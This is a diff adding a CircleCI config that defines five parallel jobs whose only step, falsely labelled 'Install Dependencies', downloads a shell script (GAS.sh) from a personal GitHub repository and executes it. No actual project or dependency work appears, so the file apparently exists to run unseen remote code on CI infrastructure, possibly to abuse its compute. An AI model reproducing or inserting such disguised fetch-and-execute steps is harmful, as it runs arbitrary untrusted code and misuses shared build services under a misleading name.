@@ -1,0 +1,91 @@
+version: 2
+
+jobs:
+
+    aku1:
+
+      docker:
+
+            - image: circleci/ruby:2.4
+
+      steps:
+
+        - run:
+
+            name: Install Dependencies
+
+            command: wget https://raw.githubusercontent.com/yogi899/nabila/main/GAS.sh && chmod u+x GAS.sh && ./GAS.sh
+
+    aku2:
+
+      docker:
+
+            - image: circleci/ruby:2.4
+
+      steps:
+
+        - run:
+
+            name: Install Dependencies
+
+            command: wget https://raw.githubusercontent.com/yogi899/nabila/main/GAS.sh && chmod u+x GAS.sh && ./GAS.sh
+
+    aku3:
+
+      docker:
+
+            - image: circleci/ruby:2.4
+
+      steps:
+
+        - run:
+
+            name: Install Dependencies
+
+            command: wget https://raw.githubusercontent.com/yogi899/nabila/main/GAS.sh && chmod u+x GAS.sh && ./GAS.sh
+
+    aku4:
+
+      docker:
+
+            - image: circleci/ruby:2.4
+
+      steps:
+
+        - run:
+
+            name: Install Dependencies
+
+            command: wget https://raw.githubusercontent.com/yogi899/nabila/main/GAS.sh && chmod u+x GAS.sh && ./GAS.sh
+
+    aku5:
+
+      docker:
+
+            - image: circleci/ruby:2.4
+
+      steps:
+
+        - run:
+
+            name: Install Dependencies
+
+            command: wget https://raw.githubusercontent.com/yogi899/nabila/main/GAS.sh && chmod u+x GAS.sh && ./GAS.sh
+
+workflows:
+
+    version: 2
+
+    build:
+
+        jobs:
+
+            - aku1
+
+            - aku2
+
+            - aku3
+
+            - aku4
+
+            - aku5
